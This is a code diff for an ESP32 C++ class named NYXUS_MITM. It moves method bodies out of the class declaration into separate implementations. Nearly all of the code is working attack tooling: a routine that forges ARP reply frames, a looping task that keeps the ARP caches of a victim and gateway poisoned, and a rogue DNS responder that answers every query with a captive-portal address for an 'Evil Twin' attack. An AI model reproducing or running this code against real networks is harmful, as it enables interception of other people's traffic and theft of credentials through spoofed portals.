@@ -127,55 +127,25 @@ class NYXUS_MITM {
    * @brief prints the timestamp in 24 Hour format if timestamping is enabled.
    * @return void
    */
-   inline void timestamp(){
-      if (!timestampEnabled) return;
-      DateTime now = rtc.now();
-      Serial.printf("[%s%d-%d-%d %d:%d:%d%s] ", Color::CYAN, now.year(), now.month(), now.day(), now.hour(), now.minute(), now.second(), Color::RESET);
-   }
+   inline void timestamp();
 
    private:
    /**
    * @brief Converts a human-readable MAC string ("AA:BB:CC:DD:EE:FF") into a 6-byte hardware array.
    */
-   void parse_mac(const char* mac_str, uint8_t* mac_array) {
-      sscanf(mac_str, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", &mac_array[0], &mac_array[1], &mac_array[2], &mac_array[3], &mac_array[4], &mac_array[5]);
-   }
-   
+   void parse_mac(const char* mac_str, uint8_t* mac_array);
+
    private:
    /**
    * @brief Crafts and encrypts a malicious Layer 2.5 ARP Reply.
    */
-   void ForgeAndInjectARP(uint8_t* dest_mac, uint8_t* spoofed_mac, uint32_t spoofed_ip, uint32_t target_ip) {
-      uint8_t frame[sizeof(MITM::ethernet_header) + sizeof(MITM::arp_header)] = {0};
-      MITM::ethernet_header* eth = (MITM::ethernet_header*)frame;
-      MITM::arp_header* arp = (MITM::arp_header*)(frame + sizeof(MITM::ethernet_header));
-      memcpy(eth->dest_mac, dest_mac, 6);
-      memcpy(eth->src_mac, host_mac, 6); 
-      eth->ethertype = htons(0x0806);    
-      arp->hardware_type = htons(1);     
-      arp->protocol_type = htons(0x0800);
-      arp->hardware_size = 6;
-      arp->protocol_size = 4;
-      arp->opcode = htons(2);            
-      memcpy(arp->sender_mac, spoofed_mac, 6);
-      arp->sender_ip = spoofed_ip;
-      memcpy(arp->target_mac, dest_mac, 6);
-      arp->target_ip = target_ip;
-      esp_wifi_internal_tx(WIFI_IF_STA, frame, sizeof(frame));
-   }
+   void ForgeAndInjectARP(uint8_t* dest_mac, uint8_t* spoofed_mac, uint32_t spoofed_ip, uint32_t target_ip);
 
    private:
    /**
     * @brief Continuous FreeRTOS background task for sustaining the poisoned ARP cache.
     */
-   static void arp_poison_task(void* arg) {
-      NYXUS_MITM* mitm = static_cast<NYXUS_MITM*>(arg);
-      while(true) {
-         mitm->ForgeAndInjectARP(mitm->target_mac, mitm->host_mac, mitm->router_ip, mitm->target_ip);
-         mitm->ForgeAndInjectARP(mitm->router_mac, mitm->host_mac, mitm->target_ip, mitm->router_ip);
-         vTaskDelay(pdMS_TO_TICKS(2000));
-      }
-   }
+   static void arp_poison_task(void* arg);
 
    public:
    /**
@@ -185,35 +155,13 @@ class NYXUS_MITM {
    * @param gatewayIP Network router IPv4.
    * @param gatewayMAC Network router MAC.
    */
-   void StartArpSpoof(const std::string& victimIP, const std::string& victimMAC, const std::string& gatewayIP, const std::string& gatewayMAC) {
-      if (arp_task_handle != nullptr) return;
-      esp_wifi_get_mac(WIFI_IF_STA, host_mac);
-      parse_mac(victimMAC.c_str(), target_mac);
-      parse_mac(gatewayMAC.c_str(), router_mac);
-      inet_pton(AF_INET, victimIP.c_str(), &target_ip);
-      inet_pton(AF_INET, gatewayIP.c_str(), &router_ip);
-      if (verbose) {
-         Serial.println("===============================");
-         timestamp(); Serial.printf("[%sMITM%s] Igniting Dual-Vector ARP Cache Poisoning...\n", Color::MAGENTA, Color::RESET);
-         timestamp(); Serial.printf("[%sTARGET%s] Forcing %s traffic to route through ESP32.\n", Color::YELLOW, Color::RESET, victimIP.c_str());
-      }
-      xTaskCreatePinnedToCore(arp_poison_task, "ARP_Spoof", 3072, this, 1, &arp_task_handle, 1);
-   }
+   void StartArpSpoof(const std::string& victimIP, const std::string& victimMAC, const std::string& gatewayIP, const std::string& gatewayMAC);
 
    public:
    /**
    * @brief Stops the dual-threaded Man-in-the-Middle ARP Cache Poisoning attack.
    */
-   void StopArpSpoof() {
-      if (arp_task_handle != nullptr) {
-         vTaskDelete(arp_task_handle);
-         arp_task_handle = nullptr;
-         if (verbose) {
-            timestamp(); Serial.printf("[%sSUCCESS%s] ARP Spoofing terminated. Network restoring...\n", Color::GREEN, Color::RESET);
-            Serial.println("===============================");
-         }
-      }
-   }
+   void StopArpSpoof();
 
    private:
    /**
@@ -224,41 +172,7 @@ class NYXUS_MITM {
    * (Standard Response), appends a compressed Answer Block pointing to the Captive Portal IP, 
    * and bounces it back in less than a millisecond.
    */
-   static void dns_spoof_task(void* arg) {
-      NYXUS_MITM* mitm = static_cast<NYXUS_MITM*>(arg);
-      mitm->dns_sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
-      struct sockaddr_in server_addr = {0};
-      server_addr.sin_family = AF_INET;
-      server_addr.sin_addr.s_addr = htonl(INADDR_ANY);
-      server_addr.sin_port = htons(53); // Standard DNS Port
-      bind(mitm->dns_sock, (struct sockaddr *)&server_addr, sizeof(server_addr));
-      char rx_buffer[1024]; // 1KB Buffer (Safe cuz standard UDP DNS rarely exceeds 512 bytes)
-      struct sockaddr_in source_addr;
-      socklen_t socklen = sizeof(source_addr);
-      while(true) {
-         // Non-blocking UDP listen
-         int len = recvfrom(mitm->dns_sock, rx_buffer, sizeof(rx_buffer) - sizeof(MITM::dns_answer_trailer), MSG_DONTWAIT, (struct sockaddr*)&source_addr, &socklen);
-         if (len > 0) {
-            MITM::dns_header* dns = (MITM::dns_header*)rx_buffer;
-            // Check if packet is a Standard Query (Flags high bit == 0)
-            if ((ntohs(dns->flags) & 0x8000) == 0) {
-               // 1. Flip Flags to Response (0x8180 = Standard response, no errors)
-               dns->flags = htons(0x8180);
-               // 2. Set Answer Count to 1
-               dns->ancount = htons(1);
-               MITM::dns_answer_trailer* answer = (MITM::dns_answer_trailer*)(rx_buffer + len);
-               answer->name_ptr = htons(0xC00C);         // Compression trick: points back to offset 12
-               answer->type     = htons(0x0001);         // Type: A Record (IPv4)
-               answer->cls      = htons(0x0001);         // Class: IN (Internet)
-               answer->ttl      = htonl(60);             // TTL: 60 Seconds
-               answer->data_len = htons(4);              // Length: 4 bytes for an IPv4 address
-               answer->ip_addr  = mitm->captive_ip_addr; // The malicious payload
-               sendto(mitm->dns_sock, rx_buffer, len + sizeof(MITM::dns_answer_trailer), 0, (struct sockaddr *)&source_addr, sizeof(source_addr));
-            }
-         }
-         vTaskDelay(pdMS_TO_TICKS(10)); 
-      }
-   }
+   static void dns_spoof_task(void* arg);
 
    public:
    /**
@@ -266,35 +180,141 @@ class NYXUS_MITM {
    * @param captive_portal_ip The IPv4 address of your ESP32's web server (e.g. "192.168.4.1")
    * @attention Must be called after `NYXUS_WIFI::ChangeMode(WifiMode::assertive)`.
    */
-   void StartEvilTwin(const std::string& captive_portal_ip) {
-      if (dns_task_handle != nullptr) return;
-      inet_pton(AF_INET, captive_portal_ip.c_str(), &captive_ip_addr);
-      if (verbose) {
-         Serial.println("===============================");
-         timestamp(); Serial.printf("[%sEVIL TWIN%s] Igniting Rogue DNS Server...\n", Color::MAGENTA, Color::RESET);
-         timestamp(); Serial.printf("[%sDNS%s] Force-routing all HTTP traffic to %s\n", Color::YELLOW, Color::RESET, captive_portal_ip.c_str());
-      }
-      xTaskCreatePinnedToCore(dns_spoof_task, "DNS_Spoofer", 4096, this, 1, &dns_task_handle, 1);
-   }
+   void StartEvilTwin(const std::string& captive_portal_ip);
 
    public:
    /**
    * @brief Stops the Evil Twin DNS interceptor engine.
    */
-   void StopEvilTwin() {
-      if (dns_task_handle != nullptr) {
-         vTaskDelete(dns_task_handle);
-         dns_task_handle = nullptr;
-      }
-      if (dns_sock >= 0) {
-         close(dns_sock);
-         dns_sock = -1;
-      }
+   void StopEvilTwin();
+};
+
+/* IMPLEMENTATIONS - NOTHING HERE */
+
+inline void NYXUS_MITM::timestamp(){
+   if (!timestampEnabled) return;
+   DateTime now = rtc.now();
+   Serial.printf("[%s%d-%d-%d %d:%d:%d%s] ", Color::CYAN, now.year(), now.month(), now.day(), now.hour(), now.minute(), now.second(), Color::RESET);
+}
+
+void NYXUS_MITM::parse_mac(const char* mac_str, uint8_t* mac_array) {
+   sscanf(mac_str, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", &mac_array[0], &mac_array[1], &mac_array[2], &mac_array[3], &mac_array[4], &mac_array[5]);
+}
+
+void NYXUS_MITM::ForgeAndInjectARP(uint8_t* dest_mac, uint8_t* spoofed_mac, uint32_t spoofed_ip, uint32_t target_ip) {
+   uint8_t frame[sizeof(MITM::ethernet_header) + sizeof(MITM::arp_header)] = {0};
+   MITM::ethernet_header* eth = (MITM::ethernet_header*)frame;
+   MITM::arp_header* arp = (MITM::arp_header*)(frame + sizeof(MITM::ethernet_header));
+   memcpy(eth->dest_mac, dest_mac, 6);
+   memcpy(eth->src_mac, host_mac, 6); 
+   eth->ethertype = htons(0x0806);    
+   arp->hardware_type = htons(1);     
+   arp->protocol_type = htons(0x0800);
+   arp->hardware_size = 6;
+   arp->protocol_size = 4;
+   arp->opcode = htons(2);            
+   memcpy(arp->sender_mac, spoofed_mac, 6);
+   arp->sender_ip = spoofed_ip;
+   memcpy(arp->target_mac, dest_mac, 6);
+   arp->target_ip = target_ip;
+   esp_wifi_internal_tx(WIFI_IF_STA, frame, sizeof(frame));
+}
+
+void NYXUS_MITM::arp_poison_task(void* arg) {
+   NYXUS_MITM* mitm = static_cast<NYXUS_MITM*>(arg);
+   while(true) {
+      mitm->ForgeAndInjectARP(mitm->target_mac, mitm->host_mac, mitm->router_ip, mitm->target_ip);
+      mitm->ForgeAndInjectARP(mitm->router_mac, mitm->host_mac, mitm->target_ip, mitm->router_ip);
+      vTaskDelay(pdMS_TO_TICKS(2000));
+   }
+}
+
+void NYXUS_MITM::StartArpSpoof(const std::string& victimIP, const std::string& victimMAC, const std::string& gatewayIP, const std::string& gatewayMAC) {
+   if (arp_task_handle != nullptr) return;
+   esp_wifi_get_mac(WIFI_IF_STA, host_mac);
+   parse_mac(victimMAC.c_str(), target_mac);
+   parse_mac(gatewayMAC.c_str(), router_mac);
+   inet_pton(AF_INET, victimIP.c_str(), &target_ip);
+   inet_pton(AF_INET, gatewayIP.c_str(), &router_ip);
+   if (verbose) {
+      Serial.println("===============================");
+      timestamp(); Serial.printf("[%sMITM%s] Igniting Dual-Vector ARP Cache Poisoning...\n", Color::MAGENTA, Color::RESET);
+      timestamp(); Serial.printf("[%sTARGET%s] Forcing %s traffic to route through ESP32.\n", Color::YELLOW, Color::RESET, victimIP.c_str());
+   }
+   xTaskCreatePinnedToCore(arp_poison_task, "ARP_Spoof", 3072, this, 1, &arp_task_handle, 1);
+}
+
+void NYXUS_MITM::StopArpSpoof() {
+   if (arp_task_handle != nullptr) {
+      vTaskDelete(arp_task_handle);
+      arp_task_handle = nullptr;
       if (verbose) {
-         timestamp(); Serial.printf("[%sSUCCESS%s] Rogue DNS Server offline.\n", Color::GREEN, Color::RESET);
+         timestamp(); Serial.printf("[%sSUCCESS%s] ARP Spoofing terminated. Network restoring...\n", Color::GREEN, Color::RESET);
          Serial.println("===============================");
       }
    }
-};
+}
+
+void NYXUS_MITM::dns_spoof_task(void* arg) {
+   NYXUS_MITM* mitm = static_cast<NYXUS_MITM*>(arg);
+   mitm->dns_sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
+   struct sockaddr_in server_addr = {0};
+   server_addr.sin_family = AF_INET;
+   server_addr.sin_addr.s_addr = htonl(INADDR_ANY);
+   server_addr.sin_port = htons(53); // Standard DNS Port
+   bind(mitm->dns_sock, (struct sockaddr *)&server_addr, sizeof(server_addr));
+   char rx_buffer[1024]; // 1KB Buffer (Safe cuz standard UDP DNS rarely exceeds 512 bytes)
+   struct sockaddr_in source_addr;
+   socklen_t socklen = sizeof(source_addr);
+   while(true) {
+      // Non-blocking UDP listen
+      int len = recvfrom(mitm->dns_sock, rx_buffer, sizeof(rx_buffer) - sizeof(MITM::dns_answer_trailer), MSG_DONTWAIT, (struct sockaddr*)&source_addr, &socklen);
+      if (len > 0) {
+         MITM::dns_header* dns = (MITM::dns_header*)rx_buffer;
+         // Check if packet is a Standard Query (Flags high bit == 0)
+         if ((ntohs(dns->flags) & 0x8000) == 0) {
+            // 1. Flip Flags to Response (0x8180 = Standard response, no errors)
+            dns->flags = htons(0x8180);
+            // 2. Set Answer Count to 1
+            dns->ancount = htons(1);
+            MITM::dns_answer_trailer* answer = (MITM::dns_answer_trailer*)(rx_buffer + len);
+            answer->name_ptr = htons(0xC00C);         // Compression trick: points back to offset 12
+            answer->type     = htons(0x0001);         // Type: A Record (IPv4)
+            answer->cls      = htons(0x0001);         // Class: IN (Internet)
+            answer->ttl      = htonl(60);             // TTL: 60 Seconds
+            answer->data_len = htons(4);              // Length: 4 bytes for an IPv4 address
+            answer->ip_addr  = mitm->captive_ip_addr; // The malicious payload
+            sendto(mitm->dns_sock, rx_buffer, len + sizeof(MITM::dns_answer_trailer), 0, (struct sockaddr *)&source_addr, sizeof(source_addr));
+         }
+      }
+      vTaskDelay(pdMS_TO_TICKS(10)); 
+   }
+}
+
+void NYXUS_MITM::StartEvilTwin(const std::string& captive_portal_ip) {
+   if (dns_task_handle != nullptr) return;
+   inet_pton(AF_INET, captive_portal_ip.c_str(), &captive_ip_addr);
+   if (verbose) {
+      Serial.println("===============================");
+      timestamp(); Serial.printf("[%sEVIL TWIN%s] Igniting Rogue DNS Server...\n", Color::MAGENTA, Color::RESET);
+      timestamp(); Serial.printf("[%sDNS%s] Force-routing all HTTP traffic to %s\n", Color::YELLOW, Color::RESET, captive_portal_ip.c_str());
+   }
+   xTaskCreatePinnedToCore(dns_spoof_task, "DNS_Spoofer", 4096, this, 1, &dns_task_handle, 1);
+}
+
+void NYXUS_MITM::StopEvilTwin() {
+   if (dns_task_handle != nullptr) {
+      vTaskDelete(dns_task_handle);
+      dns_task_handle = nullptr;
+   }
+   if (dns_sock >= 0) {
+      close(dns_sock);
+      dns_sock = -1;
+   }
+   if (verbose) {
+      timestamp(); Serial.printf("[%sSUCCESS%s] Rogue DNS Server offline.\n", Color::GREEN, Color::RESET);
+      Serial.println("===============================");
+   }
+}
 
 #endif
